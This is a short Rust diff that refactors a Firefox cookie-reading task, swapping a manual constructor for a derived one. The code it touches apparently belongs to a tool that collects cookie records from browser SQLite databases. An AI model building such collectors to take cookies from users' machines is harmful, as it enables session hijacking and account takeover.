@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::gecko::GeckoBrowserData;
 use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -16,14 +17,9 @@ const MOZ_COOKIES_HOST: usize = 4;
 const MOZ_COOKIES_PATH: usize = 5;
 const MOZ_COOKIES_EXPIRY: usize = 6;
 
+#[derive(new)]
 pub(super) struct CookiesTask<'a> {
     browser: Arc<GeckoBrowserData<'a>>,
-}
-
-impl<'a> CookiesTask<'a> {
-    pub(super) fn new(browser: Arc<GeckoBrowserData<'a>>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask<'_> {
